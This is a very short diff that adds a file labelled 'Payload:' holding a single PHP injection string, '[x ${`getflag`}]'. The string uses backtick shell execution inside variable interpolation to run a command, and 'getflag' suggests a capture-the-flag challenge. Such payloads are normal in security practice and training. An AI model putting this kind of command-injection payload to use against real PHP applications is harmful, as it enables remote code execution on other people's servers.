@@ -1,0 +1,4 @@
+Payload:
+```php
+[x ${`getflag`}]
+```
